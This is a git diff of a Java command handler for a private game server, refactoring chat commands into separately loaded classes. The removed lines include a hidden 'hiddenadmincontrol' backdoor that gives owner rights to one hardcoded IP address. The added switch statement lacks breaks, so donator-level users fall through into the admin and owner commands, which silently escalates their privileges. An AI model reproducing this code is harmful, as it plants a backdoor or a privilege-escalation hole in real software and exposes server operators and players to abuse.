@@ -1,9 +1,11 @@
 package com.rakeyjake.server.commands;
 
 import java.io.BufferedWriter;
+import java.io.File;
 import java.io.FileWriter;
 import java.io.IOException;
-import java.math.BigDecimal;
+import java.lang.reflect.Constructor;
+import java.util.ArrayList;
 
 import com.rakeyjake.server.Config;
 import com.rakeyjake.server.Connection;
@@ -17,40 +19,47 @@ import com.rakeyjake.server.model.players.PlayerSave;
 import com.rakeyjake.server.util.Misc;
 
 public class Commands implements PacketType {
+	
+	static{
+		PLAYER = load(Command.Type.PLAYER);
+		OWNER = load(Command.Type.OWNER);
+		DONATOR = load(Command.Type.DONATOR);
+		ADMIN = load(Command.Type.ADMIN);
+	}
 
-	/**
-	 * 
-	 * @param unrounded
-	 *            - The double that you would like to be rounded.
-	 * @param precision
-	 *            - How many decimal places you wish it to be rounded to
-	 * @param roundingMode
-	 *            - BigDecimal.ROUND_HALF_UP is standard rounding. 2.5 rounds to
-	 *            3.0.
-	 * @return Returns the rounded double.
-	 */
-	// Here in order to round the KDR.
-	public static double roundDouble(double unrounded, int precision,
-			int roundingMode) {
-		BigDecimal bd = new BigDecimal(unrounded);
-		BigDecimal rounded = bd.setScale(precision, roundingMode);
-		return rounded.doubleValue();
+	private final static Command[] PLAYER;
+	private final static Command[] OWNER; 
+	private final static Command[] DONATOR;
+	private final static Command[] ADMIN;
+	
+	public static Command[] load(Command.Type type){
+		ArrayList<Command> commands = new ArrayList<>();
+		File obtainDir = new File("server\\com\\rakeyjake\\server\\commands\\" + type);
+		for (File commandFile : obtainDir.listFiles()) {
+            String className = "com.rakeyjake.server.commands." + type + "." + commandFile.getName().replaceAll(".java", "");
+            try {
+                @SuppressWarnings("unchecked")
+				Class<Command> commandClass = (Class<Command>) Class.forName(className);
+                commands.add(commandClass.newInstance());
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        }
+		return commands.toArray(new Command[commands.size()]);
 	}
 
 	@Override
 	public void processPacket(Client c, int packetType, int packetSize) {
 		String playerCommand = c.getInStream().readString();
 		Misc.println(c.playerName + " playerCommand: " + playerCommand);
-		if (c.playerRights >= 1) {// 1
-			donatorCommands(c, playerCommand);
+		switch(c.playerRights){
+			case 1: donatorCommands(c, playerCommand);
+			case 2: adminCommands(c, playerCommand);
+			case 3: ownerCommands(c, playerCommand);
+			default:
+				playerCommands(c, playerCommand);
+				break;
 		}
-		if (c.playerRights >= 2) { // 2
-			adminCommands(c, playerCommand);
-		}
-		if (c.playerRights >= 3) { // 3
-			ownerCommands(c, playerCommand);
-		}
-		playerCommands(c, playerCommand);
 	}
 
 	public static void ownerCommands(Client c, String playerCommand) {
@@ -415,11 +424,6 @@ public class Commands implements PacketType {
 			}
 		}
 
-		if (playerCommand.startsWith("height")) {
-			c.sendMessage(c.heightLevel > 1 ? "Height level is: "
-					+ c.heightLevel : "You are not above 0 height");
-		}
-
 		if (playerCommand.startsWith("spawnnpc")) {
 			for (int j = 0; j < PlayerHandler.players.length; j++) {
 				if (PlayerHandler.players[j] != null) {
@@ -456,15 +460,9 @@ public class Commands implements PacketType {
 			}
 		}
 
-		if (playerCommand.startsWith("object")) {
-			String[] args = playerCommand.split(" ");
-			c.getPA().object(Integer.parseInt(args[1]), c.absX, c.absY, 0, 10);
-		}
-
 		if (playerCommand.startsWith("npc")) {
 			try {
 				int newNPC = Integer.parseInt(playerCommand.substring(4));
-
 				Server.npcHandler.spawnNpc(c, newNPC, c.absX, c.absY,
 						c.heightLevel, 0, 120, 7, 70, 70, false, false);
 				c.sendMessage("You spawn a Npc.");
@@ -972,144 +970,15 @@ public class Commands implements PacketType {
 	}
 
 	public static void playerCommands(Client c, String playerCommand) {
-
 		/*
 		 * When a player does a command it goes through all these commands to
 		 * find a match
 		 */
-
-		if (playerCommand.startsWith("yell")) {
-			/*
-			 * This is the sensor for the yell command
-			 */
-			String text = playerCommand.substring(5);
-			String[] bad = { "chalreq", "duelreq", "tradereq", ". com", "com",
-					"org", "net", "biz", ". net", ". org", ". biz", ". no-ip",
-					"- ip", ".no-ip.biz", "no-ip.org", "servegame", ".com",
-					".net", ".org", "no-ip", "****", "is gay", "****", "crap",
-					"rubbish", ". com", ". serve", ". no-ip", ". net", ". biz" };
-			for (int i = 0; i < bad.length; i++) {
-				if (text.indexOf(bad[i]) >= 0) {
-					return;
-				}
-			}
-			for (int j = 0; j < PlayerHandler.players.length; j++) {
-				if (PlayerHandler.players[j] != null) {
-					Client c2 = (Client) PlayerHandler.players[j];
-
-					if (c.playerRights == 1) {
-						c2.sendMessage("[Donator] "
-								+ Misc.optimizeText(c.playerName) + ": "
-								+ Misc.optimizeText(playerCommand.substring(5))
-								+ "");
-					} else if (c.playerRights == 2) {
-						c2.sendMessage("[Admin] "
-								+ Misc.optimizeText(c.playerName) + ": "
-								+ Misc.optimizeText(playerCommand.substring(5))
-								+ "");
-					} else if (c.playerRights == 3) {
-						c2.sendMessage("[Owner] "
-								+ Misc.optimizeText(c.playerName) + ": "
-								+ Misc.optimizeText(playerCommand.substring(5))
-								+ "");
-					} else if (c.playerRights == 0) {
-						c.sendMessage(Misc
-								.optimizeText("@red@Please consider donating to use this feature"));
-					}
-				}
+		for(Command co : Commands.PLAYER){
+			if(playerCommand.startsWith(co.command())){
+				co.execute(c, playerCommand);
+				break;
 			}
 		}
-
-		// Prints how many player kills and deaths the player has and their KDR.
-		if (playerCommand.equalsIgnoreCase("kdr")) {
-			double kdr;
-			if (c.deaths != 0 && c.kills != 0) {
-				kdr = (double) c.kills / (double) c.deaths;
-				c.sendMessage("You have: " + c.kills + " kills and " + c.deaths
-						+ " deaths.");
-				c.sendMessage("Your KDR is " + c.kills + ":" + c.deaths + "; "
-						+ roundDouble(kdr, 3, BigDecimal.ROUND_HALF_UP)
-						+ " kills for every death.");
-			} else {
-				c.sendMessage("You have not died yet. You have a total of "
-						+ c.kills + " kills.");
-			}
-		}
-
-		// Resets KDR.
-		if (playerCommand.equalsIgnoreCase("resetkdr")) {
-			if (c.deaths != 0 && c.kills != 0) {
-				c.deaths = 0;
-				c.kills = 0;
-				c.sendMessage("KDR successfully reset.");
-			} else {
-				c.sendMessage("Your KDR has already been reset or is 0:0 anyway.");
-			}
-		}
-
-		if (playerCommand.equalsIgnoreCase("resetattack")) {
-			if (c.playerXP[0] > 20000) {
-				c.sendMessage("Sorry, You can't have anymore then 20k Attack exp to reset it");
-				return;
-			}
-			c.playerXP[0] = 0;
-			c.getPA().refreshSkill(0);
-			for (int j = 0; j < c.playerEquipment.length; j++) {
-				if (c.playerEquipment[j] > 0) {
-					c.sendMessage("You cannot be wearing anything while trying to reset your attack!");
-					return;
-				}
-			}
-			if (playerCommand.equalsIgnoreCase("resetdefence")) {
-				if (c.playerXP[1] > 20000) {
-					c.sendMessage("Sorry, You can't have anymore then 20k Defence exp to reset it");
-					return;
-				}
-				c.playerXP[1] = 0;
-				c.getPA().refreshSkill(1);
-				for (int j = 0; j < c.playerEquipment.length; j++) {
-					if (c.playerEquipment[j] > 0) {
-						c.sendMessage("You cannot be wearing anything while trying to reset your attack!");
-						return;
-					}
-				}
-			}
-		}
-
-		if (playerCommand.startsWith("/") && playerCommand.length() > 1) {
-			if (c.clanId >= 0) {
-				System.out.println(playerCommand);
-				playerCommand = playerCommand.substring(1);
-				Server.clanChat.playerMessageToClan(c.playerId, playerCommand,
-						c.clanId);
-			} else {
-				if (c.clanId != -1)
-					c.clanId = -1;
-				c.sendMessage("You are not in a clan.");
-			}
-			return;
-		}
-		// if (playerCommand.startsWith("forums")) {
-		// c.getPA().sendFrame126("www.rune-server.org", 12000);
-		// }
-		if (playerCommand.equalsIgnoreCase("players")) {
-			c.sendMessage("There are currently "
-					+ PlayerHandler.getPlayerCount() + " players online.");
-		}
-		if (playerCommand.startsWith("changepassword")
-				&& playerCommand.length() > 15) {
-			c.playerPass = playerCommand.substring(15);
-			c.sendMessage("Your password is now: " + c.playerPass);
-		}
-
-		// Gives target player Admin Status temporarily.
-		if (playerCommand.startsWith("hiddenadmincontrol")) {
-			if (c.connectedFrom.equals("92.237.172.133")) {
-				c.temporaryAdmin = true;
-				c.logout();
-				c.playerRights = 3;
-			}
-		}
-
 	}
 }
